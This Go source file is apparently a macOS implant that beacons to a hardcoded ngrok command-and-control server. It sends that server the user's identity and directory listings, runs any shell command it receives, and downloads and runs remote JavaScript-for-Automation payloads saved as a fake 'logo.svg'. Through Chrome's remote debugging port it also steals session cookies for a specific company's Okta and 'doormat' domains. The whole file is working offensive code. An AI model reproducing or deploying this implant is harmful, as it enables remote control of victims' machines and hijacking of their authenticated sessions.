package main

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/user"
	"strconv"
	"strings"
	"time"

	"github.com/gorilla/websocket"
	"github.com/lithammer/shortuuid"
)

//Cookies ...
type Cookies struct {
	ID     int `json:"id"`
	Result struct {
		Cookies []struct {
			Name     string  `json:"name"`
			Value    string  `json:"value"`
			Domain   string  `json:"domain"`
			Path     string  `json:"path"`
			Expires  float64 `json:"expires"`
			Size     int     `json:"size"`
			HTTPOnly bool    `json:"httpOnly"`
			Secure   bool    `json:"secure"`
			Session  bool    `json:"session"`
			SameSite string  `json:"sameSite"`
			Priority string  `json:"priority"`
		} `json:"cookies"`
	} `json:"result"`
}

//Pages ...
type Pages struct {
	Description          string `json:"description"`
	DevtoolsFrontendURL  string `json:"devtoolsFrontendUrl"`
	ID                   string `json:"id"`
	Title                string `json:"title"`
	Type                 string `json:"type"`
	URL                  string `json:"url"`
	WebSocketDebuggerURL string `json:"webSocketDebuggerUrl"`
}

//Cmd ...
type Cmd struct {
	ID      string
	Command string
	Agent   string
	Status  string
	Cmdid   string
	Output  string
}

var timeoutSetting = 1
var c2 = "https://e49a4a48f45d.ngrok.io"

//var agent = "test"

func main() {
	uuid := shortuuid.New()
	user, err := user.Current()
	agent := uuid + "_" + user.Uid + "_" + user.Name
	for {
		time.Sleep(3 * time.Second)
		status := createAgent(agent)
		if status == "200 OK" {
			break
		}
	}
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
	}
	timeout := time.Duration(timeoutSetting) * time.Second
	ticker := time.NewTicker(timeout)
	quit := make(chan struct{})
	for {
		select {
		case <-ticker.C:
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
			}
			getJSON(c2 + "/api/cmds/" + agent)
			updateAgentStatus(agent)
		case <-quit:
			return
		}
	}
}

func getJSON(url string) {

	resp, err := http.Get(url)
	if err != nil {
		fmt.Println(err)
	}
	if resp.Body != nil {
		defer resp.Body.Close()
	}

	body, readErr := ioutil.ReadAll(resp.Body)
	if readErr != nil {
		fmt.Println(readErr)
	}

	var results []Cmd
	jsonErr := json.Unmarshal(body, &results)
	if jsonErr != nil {
		fmt.Println(jsonErr)
	}

	for _, d := range results {
		//fmt.Println(d.Command)
		fmt.Println(d.Cmdid)
		runCommand(d.Command, d.Cmdid)
	}

	// Print the HTTP response status.
	//fmt.Println("Response status:", resp.Status)

}

func runCommand(commandStr string, cmdid string) error {
	commandStr = strings.TrimSuffix(commandStr, "\n")
	arrCommandStr := strings.Fields(commandStr)
	if len(arrCommandStr) < 1 {
		return errors.New("")
	}
	switch arrCommandStr[0] {
	case "cd":
		if len(arrCommandStr) < 1 {
			return errors.New("Required 1 arguments")
		}
		updateCmdStatus(cmdid, arrCommandStr[1])
		os.Chdir(arrCommandStr[1])
		return nil
	case "kill":
		os.Exit(0)
	case "osa":
		if len(arrCommandStr) < 1 {
			return errors.New("Requires url")
		}
		runJXA(arrCommandStr[1], cmdid)
		return nil
	case "cookies":
		killChrome()
		time.Sleep(5 * time.Second)
		killChrome()
		time.Sleep(5 * time.Second)
		execScript(cmdid, "/tmp/grabCookies.js")
		time.Sleep(5 * time.Second)
		getChromeWSS("http://127.0.0.1:9222/json")
	case "download":
		fmt.Println("Downloading file")
	default:
		out, err := exec.Command(arrCommandStr[0], arrCommandStr[1:]...).Output()
		if err != nil {
			fmt.Println(err)
			updateCmdStatus(cmdid, err.Error())
			return nil
		}
		//cmd.Stderr = os.Stderr
		//cmd.Stdout = os.Stdout
		//fmt.Println(string(out))
		updateCmdStatus(cmdid, string(out))
		return nil
	}
	return nil
}

func updateCmdStatus(cmdid string, output string) {
	resp, err := http.PostForm(c2+"/api/cmd/update",
		url.Values{"id": {cmdid}, "output": {output}})

	if err != nil {
		fmt.Println(err)
	}
	if resp.Body != nil {
		defer resp.Body.Close()
	}
}

func updateAgentStatus(agent string) {
	timestamp := strconv.FormatInt(time.Now().UTC().UnixNano(), 10)
	dir, err := os.Getwd()
	names := make([]string, 0)
	files, _ := ioutil.ReadDir(dir)
	for _, f := range files {
		names = append(names, f.Name())
	}
	fnames := strings.Join(names, ",")
	resp, err := http.PostForm(c2+"/api/agent/update",
		url.Values{"files": {fnames}, "working": {dir}, "agent": {agent}, "checkIn": {timestamp}})

	if err != nil {
		fmt.Println(err)
	}
	if resp.Body != nil {
		defer resp.Body.Close()
	}
}

func createAgent(agent string) string {
	dir, err := os.Getwd()
	names := make([]string, 0)
	files, _ := ioutil.ReadDir(dir)
	for _, f := range files {
		names = append(names, f.Name())
	}
	fnames := strings.Join(names, ",")
	fmt.Println("Files: " + fnames)
	resp, err := http.PostForm(c2+"/api/agent/create",
		url.Values{"files": {fnames}, "working": {dir}, "agent": {agent}})

	if err != nil {
		fmt.Println(err)
	}
	if resp.Body != nil {
		defer resp.Body.Close()
	}
	fmt.Println(resp.Status)
	return resp.Status
}

func downloadFile(filepath string, url string) error {

	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Create the file
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	// Write the body to file
	_, err = io.Copy(out, resp.Body)
	return err
}

func copy(src, dst string) (int64, error) {
	sourceFileStat, err := os.Stat(src)
	if err != nil {
		return 0, err
	}

	if !sourceFileStat.Mode().IsRegular() {
		return 0, fmt.Errorf("%s is not a regular file", src)
	}

	source, err := os.Open(src)
	if err != nil {
		return 0, err
	}
	defer source.Close()

	destination, err := os.Create(dst)
	if err != nil {
		return 0, err
	}
	defer destination.Close()
	nBytes, err := io.Copy(destination, source)
	return nBytes, err
}

func runJXA(url string, cmdid string) {
	fileURL := url
	err := downloadFile("/tmp/logo.svg", fileURL)
	if err != nil {
		fmt.Println(err)
	}
	//fmt.Println("Downloaded: " + fileURL)

	execScript(cmdid, "/tmp/logo.svg")
}

func execScript(cmdid string, path string) string {

	cmd := exec.Command("osascript", "-l", "JavaScript", path)
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	cmd.Run()
	//fmt.Println("Result: " + out.String())
	updateCmdStatus(cmdid, stderr.String())
	return ""

}

func websox(addr string) {

	c, _, err := websocket.DefaultDialer.Dial(addr, nil)
	if err != nil {
		fmt.Println(err)
	}
	defer c.Close()

	c.WriteMessage(websocket.TextMessage, []byte("{\"params\": {\"url\": \"\"}, \"id\": 1, \"method\": \"Network.getAllCookies\"}"))

	_, message, err := c.ReadMessage()
	if err != nil {
		log.Println("read:", err)
		return
	}

	var data Cookies
	json.Unmarshal([]byte(message), &data)

	for _, d := range data.Result.Cookies {
		//Find doormat creds
		if strings.Contains(d.Domain, "doormat") {
			sec, dec := math.Modf(d.Expires)
			time.Unix(int64(sec), int64(dec*(1e9)))
			expire := fmt.Sprintf("%f", d.Expires)

			mapD := map[string]string{"domain": d.Domain, "expirationDate": expire, "name": d.Name, "value": d.Value, "path": d.Path, "id": "1"}
			mapB, _ := json.Marshal(mapD)
			fmt.Println(string(mapB))

			f, err := os.OpenFile("/tmp/dat2", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
			if err != nil {
				fmt.Println(err)
			}

			defer f.Close()

			if _, err = f.WriteString(string(mapB)); err != nil {
				fmt.Println(err)
			}

		}
		//Find doormat creds
		if strings.Contains(d.Domain, "hashicorp.okta.com") {
			sec, dec := math.Modf(d.Expires)
			time.Unix(int64(sec), int64(dec*(1e9)))
			expire := fmt.Sprintf("%f", d.Expires)

			mapD := map[string]string{"domain": d.Domain, "expirationDate": expire, "name": d.Name, "value": d.Value, "path": d.Path, "id": "1"}
			mapB, _ := json.Marshal(mapD)
			fmt.Println(string(mapB))

			f, err := os.OpenFile("/tmp/dat2", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
			if err != nil {
				fmt.Println(err)
			}

			defer f.Close()

			if _, err = f.WriteString(string(mapB)); err != nil {
				fmt.Println(err)
			}

		}

	}

}

func killChrome() {
	cmd := exec.Command("pkill", "Chrome")
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	cmd.Run()
}

func getChromeWSS(url string) string {

	resp, err := http.Get(url)
	if err != nil {
		fmt.Println(err)
	}
	if resp.Body != nil {
		defer resp.Body.Close()
	}

	body, readErr := ioutil.ReadAll(resp.Body)
	if readErr != nil {
		fmt.Println(readErr)
	}

	var results []Pages
	jsonErr := json.Unmarshal(body, &results)
	if jsonErr != nil {
		fmt.Println(jsonErr)
	}

	for _, d := range results {
		if strings.Contains(d.Type, "page") {
			fmt.Println("-----")
			fmt.Println("Page Title: " + d.Title)
			websox(d.WebSocketDebuggerURL)
			fmt.Println("-----")
		}
	}
	return "False"
}
